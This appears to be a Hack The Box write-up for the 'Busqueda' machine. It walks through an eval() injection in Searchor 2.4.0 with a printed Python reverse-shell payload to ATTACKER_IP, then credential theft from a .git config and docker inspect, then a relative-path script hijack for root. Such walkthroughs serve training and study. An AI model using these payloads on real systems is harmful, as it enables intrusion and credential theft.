![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/c7fff3d6-767b-4211-97f0-ef11782fc766)


# Enumeration
SSH scan:
![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/f9df8937-61df-4806-91ea-c051be1ccec3)
Looks to be a linux box. 
Open ports:
- 22 - SSH - Not likely vulnerable, but could be useful if I find credentials
- 80 - HTTP - Website available. This is liekly the best place to start.

The website redirects to `searcher.htb` as a domain so I need to add this to the hosts file before I can get farther. 

The website has a tool that allows me to search typed queries to a designated search engine of my choice. The website states that it is powered by flask and "Searchor 2.4.0" which looks useful. 

Playing with the tool a bit, it obviously doesn't go out to the web, but it does spit out information such as this:
![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/33a17556-a788-4e35-9f70-4fe43c73d740)

# Foothold
Researching into the application being used here, I found that there is a vulnerability in the app. When you submit a query, it gets passed through the `eval()` parameter. Since the parameter isn't set up to sanatize inputs, I was able to get system information back by using the follwoing query as a proof of concept:
```
', exec("import subprocess;subprocess.run(['ping','-c','2', 'MY_IP']);"))#
```
This code should ping my workstation:
![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/ecb4d598-2f3f-44d3-83c4-bb08a86a4044)
Looks like command execution! Time for a shell. 

By running this command, I should get a reverse shell back on my machine:
```
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```
Results:
![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/9a383319-ecf4-4052-b2be-bc2f4532c7a5)
It gives me a shell as the `svc` user. Let's start looking around for interesting data...

Turns out, svc is an actual user on the box with a directory and not just a service account such as I expected (e.g. www-data). Within this directory is the user flag
```
svc@busqueda:~$ cd /home/svc
cd /home/svc
svc@busqueda:~$ ls
ls
user.txt
svc@busqueda:~$
```
That's the user flag! 
While digging around on this user, I was also able to find an interesting file at `/var/www/app/`. there is a hidden folder called `.git` which is interesting. Inside the directory is a config file that contains useful data:
```
svc@busqueda:/var/www/app/.git$ cat config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
svc@busqueda:/var/www/app/.git$ 
```
Credentials? There is no 'cody' user on the box... Maybe it's for the svc user? Trying to SSH into that user works!
We have credentials!
```
svc : jh1usoih2bkjaspwe92
```

# Escalation
Doing my usual enumeration steps here, I run `sudo -l` to see if we have any special permissions as sudo and we do!
```
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
svc@busqueda:~$
```
It looks like svc has permission to run this specific python script as roon. Checking the file reveals I don't have read permission which sucks... 
On the bright side, that wild card character means that I can run my own input into the script. 

After much bashing of my head against the wall, I realized that I found part of the answer I needed earlier when I found the user password. It mentions a subdomain: `gitea.searcher.htb`
Adding that to the hosts file on my machine and browsing to the site givees me a login. Trying the login I found in the config works as written!
```
cody : jh1usoih2bkjaspwe92
```
Looking through the site further doesn't reveal too much of interest. There are a few notes between cody and the admin, but I can't use them now. I did find a few scripts and one of them looked interesting: `docker-inspect.sh`. I'm guessing functions similarly to docker inspect which is a docker command used to dump a config file contents. I think this is worth trying. I will need to know the ID of the docker containter running. Thankfully there is a script already there that should do the trick: `docker-ps.sh`
Results:
```
960873171e2e - gitea
F84a6b33fb5a - mysql
```
With this info, I should be able to run the docker-inspect script for gitea and ask it to read the json config. 
Syntax used:
```
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' 960873171e2e | grep PASS
{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
```
In that mess, I see there are credentials for the database:
```
"GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh"
```
Trying these credentials in the second domain site doesn't work as is, but the password does work for the admin user!
```
Administrator : yuiu1hoiu4i5ho1uh
```
Now we might be able to actually read the scripts in detail!

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/a836a5cb-374a-47b1-931c-ff55f2e737f6)

Interesting... The code for `system-checkup.py` is running `full-check.py`:

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/744fd012-c528-4dd1-9e06-9303c0636770)

Even better, it's using the relative path rather than an absolute, which is a bad idea if you are an admin, but great for a hacker like me!
To prove this point, I created  quick proof of concept. In the /var/tmp/ directory, I created a simple hello world script and ran it from that same directory. Since it looks at the relative path, it will run from the /var/tmp directory:

![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/d9ef697d-3e68-48a2-9975-a47d48163910)

Cool! Time for root!
I created a simple bash script to send a new reverse shell back to my computer. Results: 
![image](https://github.com/HoldenDeHaan/HTB-Writeups/assets/165294830/8b4cba74-fa0f-4a1e-855a-18257ec5dc4a)

Busqueda has been PWNED!
